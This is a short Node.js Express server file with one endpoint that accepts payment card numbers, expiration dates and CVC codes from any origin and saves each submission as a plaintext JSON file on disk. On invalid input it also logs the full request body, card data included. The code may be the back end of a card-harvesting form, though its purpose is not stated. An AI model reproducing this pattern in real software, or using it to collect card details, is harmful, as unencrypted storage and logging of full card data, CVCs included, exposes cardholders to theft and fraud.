// api/server.js

const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();

app.use(cors());
app.use(bodyParser.json());

app.post('/api/save-data', (req, res) => {
  const { cardNumber, expirationDate, cvcCode } = req.body;

  if (!cardNumber || cardNumber.length !== 16 || !expirationDate || !cvcCode) {
    console.error('Invalid data received:', req.body);
    return res.status(400).json({ message: 'Invalid data' });
  }

  const timestamp = Date.now();
  const filename = `form-data-${timestamp}.json`;

  const filePath = path.join(__dirname, '..', 'data', filename); // Adjusted path for Vercel's file system

  if (!fs.existsSync(path.join(__dirname, '..', 'data'))) {
    fs.mkdirSync(path.join(__dirname, '..', 'data'));
  }

  const data = JSON.stringify({ cardNumber, expirationDate, cvcCode }, null, 2);

  fs.writeFile(filePath, data, (err) => {
    if (err) {
      console.error('Error saving data:', err);
      return res.status(500).json({ message: 'Failed to save data' });
    }
    console.log('Data saved successfully:', filename);
    res.status(200).json({ message: 'Data saved successfully', filename });
  });
});

module.exports = app;
